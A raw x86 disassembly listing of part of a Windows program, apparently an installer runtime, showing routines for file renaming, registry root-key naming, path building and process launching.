  4068af:	8b ec                	mov    %esp,%ebp
  4068b1:	8d 45 10             	lea    0x10(%ebp),%eax
  4068b4:	50                   	push   %eax
  4068b5:	ff 75 08             	push   0x8(%ebp)
  4068b8:	e8 39 fe ff ff       	call   0x4066f6
  4068bd:	85 c0                	test   %eax,%eax
  4068bf:	75 05                	jne    0x4068c6
  4068c1:	6a 06                	push   $0x6
  4068c3:	58                   	pop    %eax
  4068c4:	eb 12                	jmp    0x4068d8
  4068c6:	ff 75 14             	push   0x14(%ebp)
  4068c9:	ff 75 10             	push   0x10(%ebp)
  4068cc:	6a 00                	push   $0x0
  4068ce:	ff 75 0c             	push   0xc(%ebp)
  4068d1:	50                   	push   %eax
  4068d2:	ff 15 30 90 40 00    	call   *0x409030
  4068d8:	5d                   	pop    %ebp
  4068d9:	c2 10 00             	ret    $0x10
  4068dc:	53                   	push   %ebx
  4068dd:	55                   	push   %ebp
  4068de:	56                   	push   %esi
  4068df:	8b 74 24 14          	mov    0x14(%esp),%esi
  4068e3:	bb 00 04 00 00       	mov    $0x400,%ebx
  4068e8:	c7 05 c0 a9 46 00 4e 	movl   $0x55004e,0x46a9c0
  4068ef:	00 55 00 
  4068f2:	bd c0 a9 46 00       	mov    $0x46a9c0,%ebp
  4068f7:	c7 05 c4 a9 46 00 4c 	movl   $0x4c,0x46a9c4
  4068fe:	00 00 00 
  406901:	57                   	push   %edi
  406902:	8b 3d 24 91 40 00    	mov    0x409124,%edi
  406908:	85 f6                	test   %esi,%esi
  40690a:	74 26                	je     0x406932
  40690c:	6a 01                	push   $0x1
  40690e:	6a 00                	push   $0x0
  406910:	56                   	push   %esi
  406911:	e8 9b 08 00 00       	call   0x4071b1
  406916:	50                   	push   %eax
  406917:	ff 15 10 91 40 00    	call   *0x409110
  40691d:	53                   	push   %ebx
  40691e:	55                   	push   %ebp
  40691f:	56                   	push   %esi
  406920:	ff d7                	call   *%edi
  406922:	85 c0                	test   %eax,%eax
  406924:	0f 84 e8 00 00 00    	je     0x406a12
  40692a:	3b c3                	cmp    %ebx,%eax
  40692c:	0f 8f e0 00 00 00    	jg     0x406a12
  406932:	53                   	push   %ebx
  406933:	be c0 a1 46 00       	mov    $0x46a1c0,%esi
  406938:	56                   	push   %esi
  406939:	ff 74 24 1c          	push   0x1c(%esp)
  40693d:	ff d7                	call   *%edi
  40693f:	85 c0                	test   %eax,%eax
  406941:	0f 84 cb 00 00 00    	je     0x406a12
  406947:	3b c3                	cmp    %ebx,%eax
  406949:	0f 8f c3 00 00 00    	jg     0x406a12
  40694f:	56                   	push   %esi
  406950:	55                   	push   %ebp
  406951:	68 14 a9 40 00       	push   $0x40a914
  406956:	68 c0 9d 46 00       	push   $0x469dc0
  40695b:	ff 15 98 91 40 00    	call   *0x409198
  406961:	8b 0d 30 e2 47 00    	mov    0x47e230,%ecx
  406967:	83 c4 10             	add    $0x10,%esp
  40696a:	8b e8                	mov    %eax,%ebp
  40696c:	ff b1 28 01 00 00    	push   0x128(%ecx)
  406972:	56                   	push   %esi
  406973:	e8 19 fb ff ff       	call   0x406491
  406978:	6a 04                	push   $0x4
  40697a:	68 00 00 00 c0       	push   $0xc0000000
  40697f:	56                   	push   %esi
  406980:	e8 2c 08 00 00       	call   0x4071b1
  406985:	8b d8                	mov    %eax,%ebx
  406987:	83 fb ff             	cmp    $0xffffffff,%ebx
  40698a:	0f 84 82 00 00 00    	je     0x406a12
  406990:	6a 00                	push   $0x0
  406992:	53                   	push   %ebx
  406993:	ff 15 d0 90 40 00    	call   *0x4090d0
  406999:	8b f0                	mov    %eax,%esi
  40699b:	8d 4d 0a             	lea    0xa(%ebp),%ecx
  40699e:	03 ce                	add    %esi,%ecx
  4069a0:	51                   	push   %ecx
  4069a1:	6a 40                	push   $0x40
  4069a3:	ff 15 f8 90 40 00    	call   *0x4090f8
  4069a9:	8b f8                	mov    %eax,%edi
  4069ab:	85 ff                	test   %edi,%edi
  4069ad:	74 5c                	je     0x406a0b
  4069af:	56                   	push   %esi
  4069b0:	57                   	push   %edi
  4069b1:	53                   	push   %ebx
  4069b2:	e8 27 08 00 00       	call   0x4071de
  4069b7:	85 c0                	test   %eax,%eax
  4069b9:	74 50                	je     0x406a0b
  4069bb:	68 08 a9 40 00       	push   $0x40a908
  4069c0:	57                   	push   %edi
  4069c1:	e8 06 0a 00 00       	call   0x4073cc
  4069c6:	85 c0                	test   %eax,%eax
  4069c8:	75 4d                	jne    0x406a17
  4069ca:	68 08 a9 40 00       	push   $0x40a908
  4069cf:	8d 04 37             	lea    (%edi,%esi,1),%eax
  4069d2:	50                   	push   %eax
  4069d3:	ff 15 68 91 40 00    	call   *0x409168
  4069d9:	83 c6 0a             	add    $0xa,%esi
  4069dc:	8b ce                	mov    %esi,%ecx
  4069de:	55                   	push   %ebp
  4069df:	68 c0 9d 46 00       	push   $0x469dc0
  4069e4:	8d 04 39             	lea    (%ecx,%edi,1),%eax
  4069e7:	50                   	push   %eax
  4069e8:	e8 03 05 00 00       	call   0x406ef0
  4069ed:	33 c0                	xor    %eax,%eax
  4069ef:	50                   	push   %eax
  4069f0:	50                   	push   %eax
  4069f1:	50                   	push   %eax
  4069f2:	53                   	push   %ebx
  4069f3:	ff 15 18 91 40 00    	call   *0x409118
  4069f9:	8d 04 2e             	lea    (%esi,%ebp,1),%eax
  4069fc:	50                   	push   %eax
  4069fd:	57                   	push   %edi
  4069fe:	53                   	push   %ebx
  4069ff:	e8 9d 08 00 00       	call   0x4072a1
  406a04:	57                   	push   %edi
  406a05:	ff 15 f4 90 40 00    	call   *0x4090f4
  406a0b:	53                   	push   %ebx
  406a0c:	ff 15 10 91 40 00    	call   *0x409110
  406a12:	5f                   	pop    %edi
  406a13:	5e                   	pop    %esi
  406a14:	5d                   	pop    %ebp
  406a15:	5b                   	pop    %ebx
  406a16:	c3                   	ret
  406a17:	68 20 a9 40 00       	push   $0x40a920
  406a1c:	83 c0 0a             	add    $0xa,%eax
  406a1f:	50                   	push   %eax
  406a20:	e8 a7 09 00 00       	call   0x4073cc
  406a25:	8b c8                	mov    %eax,%ecx
  406a27:	85 c9                	test   %ecx,%ecx
  406a29:	74 b1                	je     0x4069dc
  406a2b:	8d 14 37             	lea    (%edi,%esi,1),%edx
  406a2e:	eb 06                	jmp    0x406a36
  406a30:	8a 02                	mov    (%edx),%al
  406a32:	88 04 2a             	mov    %al,(%edx,%ebp,1)
  406a35:	4a                   	dec    %edx
  406a36:	3b d1                	cmp    %ecx,%edx
  406a38:	77 f6                	ja     0x406a30
  406a3a:	2b cf                	sub    %edi,%ecx
  406a3c:	41                   	inc    %ecx
  406a3d:	eb 9f                	jmp    0x4069de
  406a3f:	33 c0                	xor    %eax,%eax
  406a41:	50                   	push   %eax
  406a42:	50                   	push   %eax
  406a43:	ff 74 24 14          	push   0x14(%esp)
  406a47:	ff 74 24 14          	push   0x14(%esp)
  406a4b:	6a ff                	push   $0xffffffff
  406a4d:	ff 74 24 18          	push   0x18(%esp)
  406a51:	50                   	push   %eax
  406a52:	50                   	push   %eax
  406a53:	ff 15 88 90 40 00    	call   *0x409088
  406a59:	c3                   	ret
  406a5a:	55                   	push   %ebp
  406a5b:	8b ec                	mov    %esp,%ebp
  406a5d:	53                   	push   %ebx
  406a5e:	56                   	push   %esi
  406a5f:	8b 75 08             	mov    0x8(%ebp),%esi
  406a62:	33 db                	xor    %ebx,%ebx
  406a64:	57                   	push   %edi
  406a65:	8b 3d 18 91 40 00    	mov    0x409118,%edi
  406a6b:	6a 01                	push   $0x1
  406a6d:	53                   	push   %ebx
  406a6e:	53                   	push   %ebx
  406a6f:	56                   	push   %esi
  406a70:	ff d7                	call   *%edi
  406a72:	85 c0                	test   %eax,%eax
  406a74:	75 52                	jne    0x406ac8
  406a76:	6a 02                	push   $0x2
  406a78:	8d 45 08             	lea    0x8(%ebp),%eax
  406a7b:	50                   	push   %eax
  406a7c:	56                   	push   %esi
  406a7d:	e8 5c 07 00 00       	call   0x4071de
  406a82:	85 c0                	test   %eax,%eax
  406a84:	74 0f                	je     0x406a95
  406a86:	b8 ff fe 00 00       	mov    $0xfeff,%eax
  406a8b:	66 3b 45 08          	cmp    0x8(%ebp),%ax
  406a8f:	75 04                	jne    0x406a95
  406a91:	33 c0                	xor    %eax,%eax
  406a93:	eb 36                	jmp    0x406acb
  406a95:	39 5d 0c             	cmp    %ebx,0xc(%ebp)
  406a98:	74 28                	je     0x406ac2
  406a9a:	6a 01                	push   $0x1
  406a9c:	53                   	push   %ebx
  406a9d:	53                   	push   %ebx
  406a9e:	56                   	push   %esi
  406a9f:	ff d7                	call   *%edi
  406aa1:	85 c0                	test   %eax,%eax
  406aa3:	75 1d                	jne    0x406ac2
  406aa5:	6a 02                	push   $0x2
  406aa7:	68 34 a5 40 00       	push   $0x40a534
  406aac:	56                   	push   %esi
  406aad:	e8 ef 07 00 00       	call   0x4072a1
  406ab2:	f7 d8                	neg    %eax
  406ab4:	1b c0                	sbb    %eax,%eax
  406ab6:	25 fb bf ff 7f       	and    $0x7fffbffb,%eax
  406abb:	05 05 40 00 80       	add    $0x80004005,%eax
  406ac0:	eb 09                	jmp    0x406acb
  406ac2:	53                   	push   %ebx
  406ac3:	53                   	push   %ebx
  406ac4:	53                   	push   %ebx
  406ac5:	56                   	push   %esi
  406ac6:	ff d7                	call   *%edi
  406ac8:	33 c0                	xor    %eax,%eax
  406aca:	40                   	inc    %eax
  406acb:	5f                   	pop    %edi
  406acc:	5e                   	pop    %esi
  406acd:	5b                   	pop    %ebx
  406ace:	5d                   	pop    %ebp
  406acf:	c2 08 00             	ret    $0x8
  406ad2:	6a 06                	push   $0x6
  406ad4:	e8 a3 06 00 00       	call   0x40717c
  406ad9:	85 c0                	test   %eax,%eax
  406adb:	74 0a                	je     0x406ae7
  406add:	ff d0                	call   *%eax
  406adf:	85 c0                	test   %eax,%eax
  406ae1:	74 04                	je     0x406ae7
  406ae3:	33 c0                	xor    %eax,%eax
  406ae5:	40                   	inc    %eax
  406ae6:	c3                   	ret
  406ae7:	33 c0                	xor    %eax,%eax
  406ae9:	c3                   	ret
  406aea:	55                   	push   %ebp
  406aeb:	8b ec                	mov    %esp,%ebp
  406aed:	51                   	push   %ecx
  406aee:	57                   	push   %edi
  406aef:	6a 64                	push   $0x64
  406af1:	ff 75 08             	push   0x8(%ebp)
  406af4:	ff 15 78 90 40 00    	call   *0x409078
  406afa:	bf 02 01 00 00       	mov    $0x102,%edi
  406aff:	eb 12                	jmp    0x406b13
  406b01:	6a 0f                	push   $0xf
  406b03:	e8 dd fc ff ff       	call   0x4067e5
  406b08:	6a 64                	push   $0x64
  406b0a:	ff 75 08             	push   0x8(%ebp)
  406b0d:	ff 15 78 90 40 00    	call   *0x409078
  406b13:	3b c7                	cmp    %edi,%eax
  406b15:	74 ea                	je     0x406b01
  406b17:	8d 45 fc             	lea    -0x4(%ebp),%eax
  406b1a:	50                   	push   %eax
  406b1b:	ff 75 08             	push   0x8(%ebp)
  406b1e:	ff 15 7c 90 40 00    	call   *0x40907c
  406b24:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406b27:	5f                   	pop    %edi
  406b28:	c9                   	leave
  406b29:	c2 04 00             	ret    $0x4
  406b2c:	8b 44 24 08          	mov    0x8(%esp),%eax
  406b30:	33 d2                	xor    %edx,%edx
  406b32:	53                   	push   %ebx
  406b33:	55                   	push   %ebp
  406b34:	56                   	push   %esi
  406b35:	57                   	push   %edi
  406b36:	6a 03                	push   $0x3
  406b38:	59                   	pop    %ecx
  406b39:	f7 f1                	div    %ecx
  406b3b:	8b 6c 24 14          	mov    0x14(%esp),%ebp
  406b3f:	8b d8                	mov    %eax,%ebx
  406b41:	8b f0                	mov    %eax,%esi
  406b43:	89 5c 24 18          	mov    %ebx,0x18(%esp)
  406b47:	39 74 24 20          	cmp    %esi,0x20(%esp)
  406b4b:	76 03                	jbe    0x406b50
  406b4d:	4e                   	dec    %esi
  406b4e:	eb 04                	jmp    0x406b54
  406b50:	8b 74 24 20          	mov    0x20(%esp),%esi
  406b54:	33 ff                	xor    %edi,%edi
  406b56:	85 f6                	test   %esi,%esi
  406b58:	74 32                	je     0x406b8c
  406b5a:	8d 5e ff             	lea    -0x1(%esi),%ebx
  406b5d:	6a 20                	push   $0x20
  406b5f:	58                   	pop    %eax
  406b60:	33 c9                	xor    %ecx,%ecx
  406b62:	3b fb                	cmp    %ebx,%edi
  406b64:	0f 44 c1             	cmove  %ecx,%eax
  406b67:	50                   	push   %eax
  406b68:	8b 44 24 20          	mov    0x20(%esp),%eax
  406b6c:	0f b6 04 07          	movzbl (%edi,%eax,1),%eax
  406b70:	50                   	push   %eax
  406b71:	68 24 ab 40 00       	push   $0x40ab24
  406b76:	55                   	push   %ebp
  406b77:	ff 15 68 92 40 00    	call   *0x409268
  406b7d:	83 c4 10             	add    $0x10,%esp
  406b80:	83 c5 06             	add    $0x6,%ebp
  406b83:	47                   	inc    %edi
  406b84:	3b fe                	cmp    %esi,%edi
  406b86:	72 d5                	jb     0x406b5d
  406b88:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  406b8c:	39 5c 24 20          	cmp    %ebx,0x20(%esp)
  406b90:	5f                   	pop    %edi
  406b91:	5e                   	pop    %esi
  406b92:	5d                   	pop    %ebp
  406b93:	5b                   	pop    %ebx
  406b94:	76 0f                	jbe    0x406ba5
  406b96:	68 34 ab 40 00       	push   $0x40ab34
  406b9b:	ff 74 24 08          	push   0x8(%esp)
  406b9f:	ff 15 6c 91 40 00    	call   *0x40916c
  406ba5:	c3                   	ret
  406ba6:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  406baa:	81 f9 00 00 00 80    	cmp    $0x80000000,%ecx
  406bb0:	75 06                	jne    0x406bb8
  406bb2:	b8 40 a9 40 00       	mov    $0x40a940,%eax
  406bb7:	c3                   	ret
  406bb8:	81 f9 01 00 00 80    	cmp    $0x80000001,%ecx
  406bbe:	75 06                	jne    0x406bc6
  406bc0:	b8 64 a9 40 00       	mov    $0x40a964,%eax
  406bc5:	c3                   	ret
  406bc6:	81 f9 02 00 00 80    	cmp    $0x80000002,%ecx
  406bcc:	75 06                	jne    0x406bd4
  406bce:	b8 88 a9 40 00       	mov    $0x40a988,%eax
  406bd3:	c3                   	ret
  406bd4:	81 f9 03 00 00 80    	cmp    $0x80000003,%ecx
  406bda:	75 06                	jne    0x406be2
  406bdc:	b8 b0 a9 40 00       	mov    $0x40a9b0,%eax
  406be1:	c3                   	ret
  406be2:	81 f9 04 00 00 80    	cmp    $0x80000004,%ecx
  406be8:	75 06                	jne    0x406bf0
  406bea:	b8 c8 a9 40 00       	mov    $0x40a9c8,%eax
  406bef:	c3                   	ret
  406bf0:	81 f9 05 00 00 80    	cmp    $0x80000005,%ecx
  406bf6:	75 06                	jne    0x406bfe
  406bf8:	b8 f4 a9 40 00       	mov    $0x40a9f4,%eax
  406bfd:	c3                   	ret
  406bfe:	81 f9 06 00 00 80    	cmp    $0x80000006,%ecx
  406c04:	75 06                	jne    0x406c0c
  406c06:	b8 1c aa 40 00       	mov    $0x40aa1c,%eax
  406c0b:	c3                   	ret
  406c0c:	85 c9                	test   %ecx,%ecx
  406c0e:	75 06                	jne    0x406c16
  406c10:	b8 38 aa 40 00       	mov    $0x40aa38,%eax
  406c15:	c3                   	ret
  406c16:	81 f9 00 00 00 40    	cmp    $0x40000000,%ecx
  406c1c:	75 06                	jne    0x406c24
  406c1e:	b8 48 aa 40 00       	mov    $0x40aa48,%eax
  406c23:	c3                   	ret
  406c24:	81 f9 00 00 00 20    	cmp    $0x20000000,%ecx
  406c2a:	75 06                	jne    0x406c32
  406c2c:	b8 5c aa 40 00       	mov    $0x40aa5c,%eax
  406c31:	c3                   	ret
  406c32:	81 f9 00 00 00 c0    	cmp    $0xc0000000,%ecx
  406c38:	75 06                	jne    0x406c40
  406c3a:	b8 70 aa 40 00       	mov    $0x40aa70,%eax
  406c3f:	c3                   	ret
  406c40:	81 f9 00 00 00 a0    	cmp    $0xa0000000,%ecx
  406c46:	75 06                	jne    0x406c4e
  406c48:	b8 80 aa 40 00       	mov    $0x40aa80,%eax
  406c4d:	c3                   	ret
  406c4e:	81 f9 01 00 00 c0    	cmp    $0xc0000001,%ecx
  406c54:	75 06                	jne    0x406c5c
  406c56:	b8 90 aa 40 00       	mov    $0x40aa90,%eax
  406c5b:	c3                   	ret
  406c5c:	81 f9 01 00 00 a0    	cmp    $0xa0000001,%ecx
  406c62:	75 06                	jne    0x406c6a
  406c64:	b8 a0 aa 40 00       	mov    $0x40aaa0,%eax
  406c69:	c3                   	ret
  406c6a:	81 f9 02 00 00 c0    	cmp    $0xc0000002,%ecx
  406c70:	75 06                	jne    0x406c78
  406c72:	b8 b0 aa 40 00       	mov    $0x40aab0,%eax
  406c77:	c3                   	ret
  406c78:	81 f9 02 00 00 a0    	cmp    $0xa0000002,%ecx
  406c7e:	75 06                	jne    0x406c86
  406c80:	b8 c0 aa 40 00       	mov    $0x40aac0,%eax
  406c85:	c3                   	ret
  406c86:	81 f9 00 00 00 60    	cmp    $0x60000000,%ecx
  406c8c:	75 06                	jne    0x406c94
  406c8e:	b8 d0 aa 40 00       	mov    $0x40aad0,%eax
  406c93:	c3                   	ret
  406c94:	81 f9 00 00 00 e0    	cmp    $0xe0000000,%ecx
  406c9a:	75 06                	jne    0x406ca2
  406c9c:	b8 e8 aa 40 00       	mov    $0x40aae8,%eax
  406ca1:	c3                   	ret
  406ca2:	81 f9 01 00 00 e0    	cmp    $0xe0000001,%ecx
  406ca8:	75 06                	jne    0x406cb0
  406caa:	b8 f8 aa 40 00       	mov    $0x40aaf8,%eax
  406caf:	c3                   	ret
  406cb0:	81 f9 02 00 00 e0    	cmp    $0xe0000002,%ecx
  406cb6:	b8 08 ab 40 00       	mov    $0x40ab08,%eax
  406cbb:	ba 18 ab 40 00       	mov    $0x40ab18,%edx
  406cc0:	0f 45 c2             	cmovne %edx,%eax
  406cc3:	c3                   	ret
  406cc4:	56                   	push   %esi
  406cc5:	8b 74 24 08          	mov    0x8(%esp),%esi
  406cc9:	56                   	push   %esi
  406cca:	ff 15 8c 90 40 00    	call   *0x40908c
  406cd0:	8d 04 46             	lea    (%esi,%eax,2),%eax
  406cd3:	50                   	push   %eax
  406cd4:	56                   	push   %esi
  406cd5:	ff 15 88 92 40 00    	call   *0x409288
  406cdb:	66 83 38 5c          	cmpw   $0x5c,(%eax)
  406cdf:	74 0c                	je     0x406ced
  406ce1:	68 ac 9a 40 00       	push   $0x409aac
  406ce6:	56                   	push   %esi
  406ce7:	ff 15 6c 91 40 00    	call   *0x40916c
  406ced:	8b c6                	mov    %esi,%eax
  406cef:	5e                   	pop    %esi
  406cf0:	c2 04 00             	ret    $0x4
  406cf3:	55                   	push   %ebp
  406cf4:	8b ec                	mov    %esp,%ebp
  406cf6:	57                   	push   %edi
  406cf7:	ff 75 08             	push   0x8(%ebp)
  406cfa:	e8 34 07 00 00       	call   0x407433
  406cff:	8b f8                	mov    %eax,%edi
  406d01:	83 ff ff             	cmp    $0xffffffff,%edi
  406d04:	74 23                	je     0x406d29
  406d06:	f6 45 0c 01          	testb  $0x1,0xc(%ebp)
  406d0a:	ff 75 08             	push   0x8(%ebp)
  406d0d:	74 21                	je     0x406d30
  406d0f:	ff 15 70 90 40 00    	call   *0x409070
  406d15:	85 c0                	test   %eax,%eax
  406d17:	75 1f                	jne    0x406d38
  406d19:	f6 45 0c 04          	testb  $0x4,0xc(%ebp)
  406d1d:	75 0a                	jne    0x406d29
  406d1f:	57                   	push   %edi
  406d20:	ff 75 08             	push   0x8(%ebp)
  406d23:	ff 15 1c 91 40 00    	call   *0x40911c
  406d29:	33 c0                	xor    %eax,%eax
  406d2b:	5f                   	pop    %edi
  406d2c:	5d                   	pop    %ebp
  406d2d:	c2 08 00             	ret    $0x8
  406d30:	ff 15 3c 91 40 00    	call   *0x40913c
  406d36:	eb dd                	jmp    0x406d15
  406d38:	33 c0                	xor    %eax,%eax
  406d3a:	40                   	inc    %eax
  406d3b:	eb ee                	jmp    0x406d2b
  406d3d:	56                   	push   %esi
  406d3e:	be c0 b1 46 00       	mov    $0x46b1c0,%esi
  406d43:	56                   	push   %esi
  406d44:	ff 74 24 0c          	push   0xc(%esp)
  406d48:	ff 15 34 91 40 00    	call   *0x409134
  406d4e:	83 f8 ff             	cmp    $0xffffffff,%eax
  406d51:	74 0b                	je     0x406d5e
  406d53:	50                   	push   %eax
  406d54:	ff 15 38 91 40 00    	call   *0x409138
  406d5a:	8b c6                	mov    %esi,%eax
  406d5c:	eb 02                	jmp    0x406d60
  406d5e:	33 c0                	xor    %eax,%eax
  406d60:	5e                   	pop    %esi
  406d61:	c2 04 00             	ret    $0x4
  406d64:	8b 44 24 04          	mov    0x4(%esp),%eax
  406d68:	0f b7 08             	movzwl (%eax),%ecx
  406d6b:	66 85 c9             	test   %cx,%cx
  406d6e:	74 1a                	je     0x406d8a
  406d70:	8b d1                	mov    %ecx,%edx
  406d72:	66 3b 54 24 08       	cmp    0x8(%esp),%dx
  406d77:	74 11                	je     0x406d8a
  406d79:	50                   	push   %eax
  406d7a:	ff 15 18 92 40 00    	call   *0x409218
  406d80:	0f b7 08             	movzwl (%eax),%ecx
  406d83:	8b d1                	mov    %ecx,%edx
  406d85:	66 85 c9             	test   %cx,%cx
  406d88:	75 e8                	jne    0x406d72
  406d8a:	c2 08 00             	ret    $0x8
  406d8d:	ff 74 24 08          	push   0x8(%esp)
  406d91:	68 38 a5 40 00       	push   $0x40a538
  406d96:	ff 74 24 0c          	push   0xc(%esp)
  406d9a:	ff 15 68 92 40 00    	call   *0x409268
  406da0:	83 c4 0c             	add    $0xc,%esp
  406da3:	c2 08 00             	ret    $0x8
  406da6:	53                   	push   %ebx
  406da7:	56                   	push   %esi
  406da8:	ff 74 24 0c          	push   0xc(%esp)
  406dac:	bb c0 5d 46 00       	mov    $0x465dc0,%ebx
  406db1:	53                   	push   %ebx
  406db2:	e8 f9 05 00 00       	call   0x4073b0
  406db7:	53                   	push   %ebx
  406db8:	e8 9e 06 00 00       	call   0x40745b
  406dbd:	8b f0                	mov    %eax,%esi
  406dbf:	85 f6                	test   %esi,%esi
  406dc1:	74 5a                	je     0x406e1d
  406dc3:	56                   	push   %esi
  406dc4:	e8 0a 08 00 00       	call   0x4075d3
  406dc9:	f6 05 2c e2 47 00 80 	testb  $0x80,0x47e22c
  406dd0:	74 0d                	je     0x406ddf
  406dd2:	0f b7 06             	movzwl (%esi),%eax
  406dd5:	66 85 c0             	test   %ax,%ax
  406dd8:	74 43                	je     0x406e1d
  406dda:	83 f8 5c             	cmp    $0x5c,%eax
  406ddd:	74 3e                	je     0x406e1d
  406ddf:	2b f3                	sub    %ebx,%esi
  406de1:	d1 fe                	sar    $1,%esi
  406de3:	eb 14                	jmp    0x406df9
  406de5:	e8 53 ff ff ff       	call   0x406d3d
  406dea:	85 c0                	test   %eax,%eax
  406dec:	74 05                	je     0x406df3
  406dee:	f6 00 10             	testb  $0x10,(%eax)
  406df1:	74 2a                	je     0x406e1d
  406df3:	53                   	push   %ebx
  406df4:	e8 ad 07 00 00       	call   0x4075a6
  406df9:	53                   	push   %ebx
  406dfa:	ff 15 8c 90 40 00    	call   *0x40908c
  406e00:	53                   	push   %ebx
  406e01:	3b c6                	cmp    %esi,%eax
  406e03:	7f e0                	jg     0x406de5
  406e05:	e8 ba fe ff ff       	call   0x406cc4
  406e0a:	53                   	push   %ebx
  406e0b:	ff 15 2c 91 40 00    	call   *0x40912c
  406e11:	33 c9                	xor    %ecx,%ecx
  406e13:	83 f8 ff             	cmp    $0xffffffff,%eax
  406e16:	0f 95 c1             	setne  %cl
  406e19:	8b c1                	mov    %ecx,%eax
  406e1b:	eb 02                	jmp    0x406e1f
  406e1d:	33 c0                	xor    %eax,%eax
  406e1f:	5e                   	pop    %esi
  406e20:	5b                   	pop    %ebx
  406e21:	c2 04 00             	ret    $0x4
  406e24:	33 c0                	xor    %eax,%eax
  406e26:	68 c0 d1 46 00       	push   $0x46d1c0
  406e2b:	66 a3 c0 d1 46 00    	mov    %ax,0x46d1c0
  406e31:	ff 15 8c 90 40 00    	call   *0x40908c
  406e37:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  406e3b:	51                   	push   %ecx
  406e3c:	ff 74 24 08          	push   0x8(%esp)
  406e40:	8d 04 45 c0 d1 46 00 	lea    0x46d1c0(,%eax,2),%eax
  406e47:	50                   	push   %eax
  406e48:	ff 15 9c 91 40 00    	call   *0x40919c
  406e4e:	6a 00                	push   $0x0
  406e50:	e8 01 00 00 00       	call   0x406e56
  406e55:	c3                   	ret
  406e56:	83 7c 24 04 00       	cmpl   $0x0,0x4(%esp)
  406e5b:	74 1a                	je     0x406e77
  406e5d:	a1 c0 c0 40 00       	mov    0x40c0c0,%eax
  406e62:	83 f8 ff             	cmp    $0xffffffff,%eax
  406e65:	74 07                	je     0x406e6e
  406e67:	50                   	push   %eax
  406e68:	ff 15 10 91 40 00    	call   *0x409110
  406e6e:	83 0d c0 c0 40 00 ff 	orl    $0xffffffff,0x40c0c0
  406e75:	eb 76                	jmp    0x406eed
  406e77:	83 3d a0 d1 46 00 00 	cmpl   $0x0,0x46d1a0
  406e7e:	74 6d                	je     0x406eed
  406e80:	66 83 3d a0 c9 46 00 	cmpw   $0x0,0x46c9a0
  406e87:	00 
  406e88:	74 31                	je     0x406ebb
  406e8a:	83 3d c0 c0 40 00 ff 	cmpl   $0xffffffff,0x40c0c0
  406e91:	75 31                	jne    0x406ec4
  406e93:	6a 04                	push   $0x4
  406e95:	68 00 00 00 40       	push   $0x40000000
  406e9a:	68 a0 c9 46 00       	push   $0x46c9a0
  406e9f:	e8 0d 03 00 00       	call   0x4071b1
  406ea4:	a3 c0 c0 40 00       	mov    %eax,0x40c0c0
  406ea9:	83 f8 ff             	cmp    $0xffffffff,%eax
  406eac:	74 3f                	je     0x406eed
  406eae:	6a 02                	push   $0x2
  406eb0:	6a 00                	push   $0x0
  406eb2:	6a 00                	push   $0x0
  406eb4:	50                   	push   %eax
  406eb5:	ff 15 18 91 40 00    	call   *0x409118
  406ebb:	83 3d c0 c0 40 00 ff 	cmpl   $0xffffffff,0x40c0c0
  406ec2:	74 29                	je     0x406eed
  406ec4:	56                   	push   %esi
  406ec5:	68 38 a9 40 00       	push   $0x40a938
  406eca:	be c0 d1 46 00       	mov    $0x46d1c0,%esi
  406ecf:	56                   	push   %esi
  406ed0:	ff 15 6c 91 40 00    	call   *0x40916c
  406ed6:	56                   	push   %esi
  406ed7:	ff 15 8c 90 40 00    	call   *0x40908c
  406edd:	03 c0                	add    %eax,%eax
  406edf:	50                   	push   %eax
  406ee0:	56                   	push   %esi
  406ee1:	ff 35 c0 c0 40 00    	push   0x40c0c0
  406ee7:	e8 b5 03 00 00       	call   0x4072a1
  406eec:	5e                   	pop    %esi
  406eed:	c2 04 00             	ret    $0x4
  406ef0:	8b 54 24 0c          	mov    0xc(%esp),%edx
  406ef4:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  406ef8:	85 d2                	test   %edx,%edx
  406efa:	74 13                	je     0x406f0f
  406efc:	56                   	push   %esi
  406efd:	8b 74 24 0c          	mov    0xc(%esp),%esi
  406f01:	2b f1                	sub    %ecx,%esi
  406f03:	8a 04 0e             	mov    (%esi,%ecx,1),%al
  406f06:	88 01                	mov    %al,(%ecx)
  406f08:	41                   	inc    %ecx
  406f09:	83 ea 01             	sub    $0x1,%edx
  406f0c:	75 f5                	jne    0x406f03
  406f0e:	5e                   	pop    %esi
  406f0f:	c2 0c 00             	ret    $0xc
  406f12:	55                   	push   %ebp
  406f13:	8b ec                	mov    %esp,%ebp
  406f15:	83 ec 10             	sub    $0x10,%esp
  406f18:	c7 05 78 1d 46 00 44 	movl   $0x44,0x461d78
  406f1f:	00 00 00 
  406f22:	8d 45 f0             	lea    -0x10(%ebp),%eax
  406f25:	50                   	push   %eax
  406f26:	68 78 1d 46 00       	push   $0x461d78
  406f2b:	33 c0                	xor    %eax,%eax
  406f2d:	50                   	push   %eax
  406f2e:	50                   	push   %eax
  406f2f:	68 00 00 00 04       	push   $0x4000000
  406f34:	50                   	push   %eax
  406f35:	50                   	push   %eax
  406f36:	50                   	push   %eax
  406f37:	ff 75 08             	push   0x8(%ebp)
  406f3a:	50                   	push   %eax
  406f3b:	ff 15 bc 90 40 00    	call   *0x4090bc
  406f41:	85 c0                	test   %eax,%eax
  406f43:	74 0c                	je     0x406f51
  406f45:	ff 75 f4             	push   -0xc(%ebp)
  406f48:	ff 15 10 91 40 00    	call   *0x409110
  406f4e:	8b 45 f0             	mov    -0x10(%ebp),%eax
  406f51:	c9                   	leave
  406f52:	c2 04 00             	ret    $0x4
  406f55:	81 ec 5c 02 00 00    	sub    $0x25c,%esp
  406f5b:	53                   	push   %ebx
  406f5c:	8b 9c 24 68 02 00 00 	mov    0x268(%esp),%ebx
  406f63:	56                   	push   %esi
  406f64:	8b b4 24 68 02 00 00 	mov    0x268(%esp),%esi
  406f6b:	57                   	push   %edi
  406f6c:	8b fb                	mov    %ebx,%edi
  406f6e:	56                   	push   %esi
  406f6f:	83 e7 04             	and    $0x4,%edi
  406f72:	e8 2f fe ff ff       	call   0x406da6
  406f77:	89 44 24 14          	mov    %eax,0x14(%esp)
  406f7b:	f6 c3 08             	test   $0x8,%bl
  406f7e:	74 17                	je     0x406f97
  406f80:	56                   	push   %esi
  406f81:	ff 15 3c 91 40 00    	call   *0x40913c
  406f87:	f7 d8                	neg    %eax
  406f89:	1b c0                	sbb    %eax,%eax
  406f8b:	40                   	inc    %eax
  406f8c:	01 05 e8 e2 47 00    	add    %eax,0x47e2e8
